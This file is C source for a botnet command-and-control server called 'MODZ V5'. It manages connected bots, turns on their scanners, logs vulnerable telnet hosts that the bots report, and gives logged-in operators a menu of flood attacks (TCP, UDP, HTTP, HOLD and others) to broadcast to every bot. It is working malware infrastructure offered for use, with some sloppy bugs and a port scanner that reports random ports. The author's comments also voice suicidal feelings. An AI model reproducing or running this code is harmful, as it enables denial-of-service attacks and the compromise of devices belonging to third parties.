//made by slumpthegod
//i still wanna die...
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#define sadidiot "V5"
#define MAXFDS 1000000
char *colorCodes[] = {"31m", "32m", "33m", "34m", "35m", "36m"};
char *ports[] = {"80", "3075", "443", "22", "53", "3074", "23", "8080"}; 
struct account {
char id[20];
char password[20];
};
static struct account accounts[50];
struct clientdata_t {
uint32_t ip;
char build[7];
char connected;
} clients[MAXFDS];
struct telnetdata_t {
int connected;
int hax;
} managements[MAXFDS];
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
int total = 0, got = 1;
while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
return got;
}
void trim(char *str)
{
int i;
int begin = 0;
int end = strlen(str) - 1;
while (isspace(str[begin])) begin++;
while ((end >= begin) && isspace(str[end])) end--;
for (i = begin; i <= end; i++) str[i - begin] = str[i];
str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd)
{
int flags, s;
flags = fcntl (sfd, F_GETFL, 0);
if (flags == -1)
{
perror ("fcntl");
return -1;
}
flags |= O_NONBLOCK;
s = fcntl (sfd, F_SETFL, flags);
if (s == -1)
{
perror ("fcntl");
return -1;
}
return 0;
}
int hackz;
static int create_and_bind (char *port)
{
struct addrinfo hints;
struct addrinfo *result, *rp;
int s, sfd;
memset (&hints, 0, sizeof (struct addrinfo));
hints.ai_family = AF_UNSPEC;
hints.ai_socktype = SOCK_STREAM;
hints.ai_flags = AI_PASSIVE;
s = getaddrinfo (NULL, port, &hints, &result);
if (s != 0)
{
fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
return -1;
}
for (rp = result; rp != NULL; rp = rp->ai_next)
{
sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
if (sfd == -1) continue;
int yes = 1;
if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
if (s == 0)
{
break;
}
close (sfd);
}
if (rp == NULL)
{
fprintf (stderr, "Could not bind\n");
return -1;
}
freeaddrinfo (result);
return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
int sendMGM = 1;
if(strcmp(msg, "PING") == 0) sendMGM = 0;
char *wot = malloc(strlen(msg) + 10);
memset(wot, 0, strlen(msg) + 10);
strcpy(wot, msg);
trim(wot);
time_t rawtime;
struct tm * timeinfo;
time(&rawtime);
timeinfo = localtime(&rawtime);
char *timestamp = asctime(timeinfo);
trim(timestamp);
int i;
for(i = 0; i < MAXFDS; i++)
{
if(i == us || (!clients[i].connected && (sendMGM == 0 || !managements[i].connected))) continue;
if(sendMGM && managements[i].connected)
{
send(i, "\x1b[33m", 5, MSG_NOSIGNAL);
send(i, sender, strlen(sender), MSG_NOSIGNAL);
send(i, ": ", 2, MSG_NOSIGNAL);
}
send(i, msg, strlen(msg), MSG_NOSIGNAL);
char *root1[1024];
char usernames[80];
sprintf(root1, "\x1b[%s\x1b[1;37m%s # \x1b[0;37m ", colorCodes[rand() % 5], usernames);
if(sendMGM && managements[i].connected) send(i, root1, strlen(root1), MSG_NOSIGNAL);
else send(i, "\n", 1, MSG_NOSIGNAL);
}
free(wot);
}
void *epollEventLoop(void *useless)
{
struct epoll_event event;
struct epoll_event *events;
int s;
events = calloc (MAXFDS, sizeof event);
while (1)
{
int n, i;
n = epoll_wait (epollFD, events, MAXFDS, -1);
for (i = 0; i < n; i++)
{
if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
{
clients[events[i].data.fd].connected = 0;
close(events[i].data.fd);
continue;
}
else if (listenFD == events[i].data.fd)
{
while (1)
{
struct sockaddr in_addr;
socklen_t in_len;
int infd, ipIndex;
in_len = sizeof in_addr;
infd = accept (listenFD, &in_addr, &in_len);
if (infd == -1)
{
if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
else
{
perror ("accept");
break;
}
}
 
 
s = make_socket_non_blocking (infd);
if (s == -1) { close(infd); break; }
event.data.fd = infd;
event.events = EPOLLIN | EPOLLET;
s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
if (s == -1)
{
perror ("epoll_ctl");
close(infd);
break;
}
clients[infd].connected = 1;
send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
}
continue;
}
else
{
int thefd = events[i].data.fd;
struct clientdata_t *client = &(clients[thefd]);
int done = 0;
client->connected = 1;
while (1)
{
int cheats;
ssize_t count;
char buf[2048];
memset(buf, 0, sizeof buf);
while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
{
if(strstr(buf, "\n") == NULL) { done = 1; break; }
trim(buf);
if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
{
if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
continue;
}
if(strstr(buf, "REPORT ") == buf) // received a report of a vulnerable system from a scan
{
char *line = strstr(buf, "REPORT ") + 7;
fprintf(telFD, "%s\n", line); // let's write it out to disk without checking what it is!
fflush(telFD);
TELFound++;
continue;
}
if(strstr(buf, "PROBING") == buf)
{
char *line = strstr(buf, "PROBING");
scannerreport = 1;
continue;
}
if(strstr(buf, "REMOVING PROBE") == buf)
{
char *line = strstr(buf, "REMOVING PROBE");
scannerreport = 0;
continue;
}
if(strcmp(buf, "PONG") == 0)
{
continue;
}
printf("MODZ-V5: \"%s\"\n", buf);
}
if (count == -1)
{
if (errno != EAGAIN)
{
done = 1;
}
break;
}
else if (count == 0)
{
done = 1;
break;
}
}
if (done)
{
client->connected = 0;
close(thefd);
}
}
}
}
}
unsigned int clientsConnected()
{
int i = 0, total = 0;
for(i = 0; i < MAXFDS; i++)
{
if(!clients[i].connected) continue;
total++;
}
return total;
}
void *titleWriter(void *sock)
{
int thefd = (int)sock;
char string[2048];
while(1)
{
memset(string, 0, 2048);
sprintf(string, "%c]0;  Bots: %d |-Bots Repped %d-| People: %d %c", '\033', clientsConnected(), TELFound, managesConnected, '\007');
if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
sleep(2);
}
}
int Search_in_File(char *str)
{
FILE *fp;
int line_num = 0;
int find_result = 0, find_line=0;
char temp[512];
if((fp = fopen("login.txt", "r")) == NULL){
return(-1);
}
while(fgets(temp, 512, fp) != NULL){
if((strstr(temp, str)) != NULL){
find_result++;
find_line = line_num;
}
line_num++;
}
if(fp)
fclose(fp);
if(find_result == 0)return 0;
return find_line;
}
void *telnetWorker(void *sock)
{
char usernames[80];
int thefd = (int)sock;
int find_line;
managesConnected++;
pthread_t title;
char counter[2048];
memset(counter, 0, 2048);
char buf[2048];
char* nickstring;
char* username;
char* password;
memset(buf, 0, sizeof buf);
char hackz[2048];
memset(hackz, 0, 2048);
FILE *fp;
int i=0;
int c;
fp=fopen("login.txt", "r"); // format: user pass
while(!feof(fp))
{
c=fgetc(fp);
++i;
}
int j=0;
rewind(fp);
while(j!=i-1)
{
fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
++j;
}
sprintf(hackz, "\x1b[%s\x1b[1;33mユーザー名を入力\x1b[1;37m:\x1b[30m ", colorCodes[(rand() % 6)]);
if (send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) goto end;
if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
trim(buf);
sprintf(usernames, buf);
nickstring = ("%s", buf);
find_line = Search_in_File(nickstring);
if(strcmp(nickstring, accounts[find_line].id) == 0){
sprintf(hackz, "\x1b[%s\x1b[1;33mパスワードを入力\x1b[1;37m:\x1b[30m ", colorCodes[(rand() % 6)]);
if (send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) goto end;
if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
trim(buf);
if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
memset(buf, 0, 2048);
goto hacker;
}
failed:
if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
if(send(thefd, "\x1b[31m 間違った\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
sleep(2);
if(send(thefd, "\x1b[31m さようなら\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
sleep(2);
goto end;
hacker:
pthread_create(&title, NULL, &titleWriter, sock);
sprintf(hackz, "\r\n       \x1b[%s\r\n", colorCodes[(rand() % 6)]);
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) goto end;
if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;//im a hacker hehehe
        char ascii_banner_line1 [5000];
        char ascii_banner_line2 [5000];
        char ascii_banner_line3 [5000];
        char ascii_banner_line4 [5000];
        char ascii_banner_line5 [5000];
        char ascii_banner_line6 [5000];
        char ascii_banner_line7 [5000];
sprintf(ascii_banner_line1, "\x1b[1;37m..........................\r\n");             
sprintf(ascii_banner_line2, "\x1b[1;37m......\x1b[1;33m##\x1b[1;37m..\x1b[1;33m##\x1b[1;37m..\x1b[1;33m######\x1b[1;37m......\r\n");
sprintf(ascii_banner_line3, "\x1b[1;37m......\x1b[1;33m##\x1b[1;37m..\x1b[1;33m##\x1b[1;37m..\x1b[1;33m##\x1b[1;37m..........\r\n");
sprintf(ascii_banner_line4, "\x1b[1;37m......\x1b[1;33m##\x1b[1;37m..\x1b[1;33m##\x1b[1;37m...\x1b[1;33m####\x1b[1;37m.......\r\n");
sprintf(ascii_banner_line5, "\x1b[1;37m.......\x1b[1;33m####\x1b[1;37m.......\x1b[1;33m##\x1b[1;37m......\r\n");
sprintf(ascii_banner_line6, "\x1b[1;37m........\x1b[1;33m##\x1b[1;37m....\x1b[1;33m#####\x1b[1;37m.......\r\n");
sprintf(ascii_banner_line7, "\x1b[1;37m..........................\r\n");
sprintf(hackz, "\x1b[%s\r\n\x1b[1;33mWELCOME\x1b[1;37m %s\x1b[%s \x1b[1;33mTo The MODZ V5 BOTNET\r\n", colorCodes[(rand() % 6)], usernames, colorCodes[(rand() % 6)]);
        if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) goto end;
char *root223[1024];
sprintf(root223, "\x1b[%s\x1b[1;37m%s # \x1b[0;37m ", colorCodes[rand() % 5], usernames);
if(send(thefd, root223, strlen(root223), MSG_NOSIGNAL) == -1) goto end;
pthread_create(&title, NULL, &titleWriter, sock);
managements[thefd].connected = 1;
while(fdgets(buf, sizeof buf, thefd) > 0)
{
if (strncmp(buf, "SHOW", 4) == 0 || strncmp(buf, "BOTS", 4) == 0 || strncmp(buf, "bots", 4) == 0)
{
sprintf(hackz, "\x1b[1;37m[\x1b[1;33m+\x1b[1;37m] \x1b[1;33mBots Online\x1b[1;37m: \x1b[1;33m%d \x1b[1;37m[\x1b[1;33m+\x1b[1;37m]\r\n", clientsConnected(), managesConnected);
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
}
if (strncmp(buf, "people", 6) == 0 || strncmp(buf, "users", 6) == 0)
{
sprintf(hackz, "\x1b[1;37m[\x1b[1;36m+\x1b[1;37m] \x1b[1;36mpeople Online\x1b[1;37m: \x1b[1;33m%d \x1b[1;37m[\x1b[1;33m+\x1b[1;37m]\r\n", clientsConnected);
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
}
if (strncmp(buf, "rules", 5) == 0 || strncmp(buf, "RULES", 5) == 0)
{
sprintf(hackz, "Please Read The Following Rules if not will result in ban\r\n1.) DO NOT SHARE YOUR ACCOUNT INFO \r\n2.) DO NOT SPAM THE NET\r\n3.) Dont hit any goverment websites\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
}
if (strncmp(buf, "?", 4) == 0 || strncmp(buf, "help", 4) == 0 || strncmp(buf, "?", 4) == 0)
{
sprintf(hackz, "\x1b[1;37m[\x1b[1;33m+\x1b[1;37m]\x1b[1;33m 攻撃コマンド\x1b[1;37m ----------------------------------\x1b[1;37m\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[1;37m!\x1b[1;33m* TCP \x1b[1;37m[\x1b[1;33mIP\x1b[0;37m] [\x1b[1;33mPORT\x1b[1;37m] [\x1b[1;33mTIME\x1b[1;37m] \x1b[1;33m32 all 1337 10 \x1b[1;37m| \x1b[1;33mTCP \x1b[1;37mフラッド\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[1;37m!\x1b[1;33m* UDP \x1b[1;37m[\x1b[1;33mIP\x1b[1;37m] [\x1b[1;33mPORT\x1b[1;37m] [\x1b[1;33mTIME\x1b[1;37m] \x1b[1;33m32 1337 10 \x1b[1;37m| \x1b[1;33mUDP \x1b[1;37mフラッド\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[1;37m!\x1b[1;33m* STD \x1b[1;37m[\x1b[1;33mIP\x1b[1;37m] [\x1b[1;33mPORT\x1b[1;37m] [\x1b[1;33mTIME\x1b[1;37m] | \x1b[1;33mSTD \x1b[1;37mフラッド\r\n"); 
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[1;37m!\x1b[1;33m* JUNK \x1b[1;37m[\x1b[1;33mIP\x1b[1;37m] [\x1b[1;33mPORT\x1b[1;37m] [\x1b[1;33mTIME\x1b[1;37m] | \x1b[1;33mJUNK \x1b[1;37mジャンク\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return; 
sprintf(hackz, "\x1b[1;37m!\x1b[1;33m* HTTP \x1b[1;37m[\x1b[1;33mIP\x1b[1;37m] [\x1b[1;33mPORT\x1b[1;37m] [\x1b[1;33mTIME\x1b[1;37m] | \x1b[1;33mHTTP \x1b[1;37mウェブ\r\n"); 
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[1;37m!\x1b[1;33m* HOLD \x1b[1;37m[\x1b[1;33mIP\x1b[1;37m] [\x1b[1;33mPORT\x1b[1;37m] [\x1b[1;33mTIME\x1b[1;37m] | \x1b[1;33mHOLD \x1b[1;37mホールド\r\n"); 
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[1;37m!\x1b[1;33m* CNC \x1b[1;37m[\x1b[1;33mIP\x1b[1;37m] [\x1b[1;33mADMIN PORT\x1b[1;37m] [\x1b[1;33mTIME\x1b[1;37m] | \x1b[1;33mCNC \x1b[1;37mフラッド\r\n"); 
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[1;37m!\x1b[1;33m* STOP \x1b[1;37m| \x1b[1;37m攻撃を止める\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[1;37mより多くのメソッドがV5.1に入っています\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[1;37m[\x1b[1;33m+\x1b[0;37m]\x1b[1;33m ポートスキャナ\x1b[1;37m-----------------------------------\x1b[0;37m\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[1;37m!\x1b[1;33m* \x1b[1;37mPORT\x1b[1;33m_\x1b[1;37mSCAN \x1b[1;33mIP \x1b[1;37m| \x1b[1;33mMAKE SURE TO PUT THE IP AT THE END\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[1;37mHai, watashi wa watashi no kusona jinsei ga kiraidesu\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
}
if(strstr(buf, "PORT_SCAN")) {
sleep(2);
sprintf(hackz, "Open Ports %s, %s\r\n", ports[(rand() % 8)], ports[(rand() % 8)]);
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
}
if (strncmp(buf, "CLEAR", 5) == 0 || strncmp(buf, "clear", 5) == 0 || strncmp(buf, "cls", 3) == 0 || strncmp(buf, "CLS", 3) == 0)
{
sprintf(hackz, "\r\n       \x1b[%s\r\n", colorCodes[(rand() % 6)]);
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) goto end;
if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        char ascii_banner_line1 [5000];
        char ascii_banner_line2 [5000];
        char ascii_banner_line3 [5000];
        char ascii_banner_line4 [5000];
        char ascii_banner_line5 [5000];
        char ascii_banner_line6 [5000];
        char ascii_banner_line7 [5000];
sprintf(ascii_banner_line1, "\x1b[1;37m..........................\r\n");             
sprintf(ascii_banner_line2, "\x1b[1;37m......\x1b[1;33m##\x1b[1;37m..\x1b[1;33m##\x1b[1;37m..\x1b[1;33m######\x1b[1;37m......\r\n");
sprintf(ascii_banner_line3, "\x1b[1;37m......\x1b[1;33m##\x1b[1;37m..\x1b[1;33m##\x1b[1;37m..\x1b[1;33m##\x1b[1;37m..........\r\n");
sprintf(ascii_banner_line4, "\x1b[1;37m......\x1b[1;33m##\x1b[1;37m..\x1b[1;33m##\x1b[1;37m...\x1b[1;33m####\x1b[1;37m.......\r\n");
sprintf(ascii_banner_line5, "\x1b[1;37m.......\x1b[1;33m####\x1b[1;37m.......\x1b[1;33m##\x1b[1;37m......\r\n");
sprintf(ascii_banner_line6, "\x1b[1;37m........\x1b[1;33m##\x1b[1;37m....\x1b[1;33m#####\x1b[1;37m.......\r\n");
sprintf(ascii_banner_line7, "\x1b[1;37m..........................\r\n");
sprintf(hackz, "\x1b[%s\r\n\x1b[1;33mWELCOME\x1b[1;37m %s\x1b[%s \x1b[1;33mTo The MODZ V5 BOTNET\r\n", colorCodes[(rand() % 6)], usernames, colorCodes[(rand() % 6)]);
        if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) goto end;
char *root55[1024];
sprintf(root55, "\x1b[%s\x1b[1;37m%s # \x1b[0;37m ", colorCodes[rand() % 5], usernames);
if(send(thefd, root55, strlen(root55), MSG_NOSIGNAL) == -1) goto end;
pthread_create(&title, NULL, &titleWriter, sock);
managements[thefd].connected = 1;
}
if (strncmp(buf, "exit", 4) == 0 || strncmp(buf, "EXIT", 4) == 0 || strncmp(buf, "LOGOUT", 6) == 0)
{
goto end;
}
if (strncmp(buf, "2000", 4) == 0 || strncmp(buf, "2100", 4) == 0 || strncmp(buf, "2200", 4) == 0 || strncmp(buf, "2300", 4) == 0 || strncmp(buf, "2400", 4) == 0 || strncmp(buf, "2500", 4) == 0)
{
printf("Over Time By %s\n", accounts[find_line].id, buf);
FILE *logFile;
logFile = fopen("OverTime.log", "a");
fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
fclose(logFile);
goto end;
}
trim(buf);
char *root2[1024];
sprintf(root2, "\x1b[%s\x1b[1;37m%s # \x1b[0;37m ", colorCodes[rand() % 5], usernames);
if(send(thefd, root2, strlen(root2), MSG_NOSIGNAL) == -1) goto end;
if(strlen(buf) == 0) continue;
printf("%s: \"%s\"\n",accounts[find_line].id, buf);
FILE *logFile;
logFile = fopen("report.log", "a");
fprintf(logFile, "%s: \"%s\"\n",accounts[find_line].id, buf);
fclose(logFile);
broadcast(buf, thefd, usernames);
memset(buf, 0, 2048);
}
end: // cleanup dead socket
managements[thefd].connected = 0;
close(thefd);
managesConnected--;
}
void *telnetListener(int port)
{
int sockfd, newsockfd;
socklen_t clilen;
struct sockaddr_in serv_addr, cli_addr;
sockfd = socket(AF_INET, SOCK_STREAM, 0);
if (sockfd < 0) perror("ERROR opening socket");
bzero((char *) &serv_addr, sizeof(serv_addr));
serv_addr.sin_family = AF_INET;
serv_addr.sin_addr.s_addr = INADDR_ANY;
serv_addr.sin_port = htons(port);
if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) perror("ERROR on binding");
listen(sockfd,5);
clilen = sizeof(cli_addr);
while(1)
{
newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
if (newsockfd < 0) perror("ERROR on accept");
pthread_t thread;
pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
}
}
int main (int argc, char *argv[], void *sock)
{
signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
int s, threads, port;
struct epoll_event event;
if (argc != 4)
{
fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
exit (EXIT_FAILURE);
}
port = atoi(argv[3]);
printf("\x1b[1;31m\x1b[43mMODZ V4\x1b[40m\x1b[0m BOTNET SCREENED \x1b[31m!\x1b[0m\n");
printf("\x1b[33mCNC OPENED \x1b[0m\n");
printf("\x1b[1;31m\x1b[43mSUCCESS\x1b[40m\x1b[0m \x1b[0m\n");
telFD = fopen("telnet.txt", "a+");
threads = atoi(argv[2]);
listenFD = create_and_bind (argv[1]); // try to create a listening socket, die if we can't
if (listenFD == -1) abort ();
s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
if (s == -1) abort ();
s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
if (s == -1)
{
perror ("listen");
abort ();
}
epollFD = epoll_create1 (0);
if (epollFD == -1)
{
perror ("epoll_create");
abort ();
}
event.data.fd = listenFD;
event.events = EPOLLIN | EPOLLET;
s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
if (s == -1)
{
perror ("epoll_ctl");
abort ();
}
pthread_t thread[threads + 2];
while(threads--)
{
pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL);
}
pthread_create(&thread[0], NULL, &telnetListener, port);
while(1)
{
broadcast("PING", -1, "HACKER");
sleep(60);
}
close (listenFD);
return EXIT_SUCCESS;
}